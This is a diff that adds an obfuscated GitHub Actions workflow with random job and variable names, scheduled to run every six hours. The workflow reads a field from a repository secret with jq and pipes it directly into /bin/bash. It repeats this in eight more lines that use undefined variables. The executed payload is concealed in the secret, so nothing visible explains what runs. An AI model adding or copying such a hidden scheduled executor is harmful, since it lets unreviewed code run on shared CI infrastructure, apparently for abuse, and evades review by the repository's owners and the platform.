@@ -1,0 +1,25 @@
+name: boergua9139
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: boergua9139
+        env:
+          othb3703: ${{ secrets.othb3703 }}
+        run: |
+          echo $othb3703 | jq -r .zw4 | /bin/bash
+          echo $vv2661 | jq -r .jrav55306 | /bin/bash
+          echo $dgkft87359 | jq -r .uxr1 | /bin/bash
+          echo $d36 | jq -r .xoci98 | /bin/bash
+          echo $gokc12 | jq -r .g6 | /bin/bash
+          echo $dnu047 | jq -r .sqp411 | /bin/bash
+          echo $fjgnz61 | jq -r .hty9327 | /bin/bash
+          echo $t12504 | jq -r .nc0748 | /bin/bash
+          echo $xfshv19313 | jq -r .roxex825 | /bin/bash
+
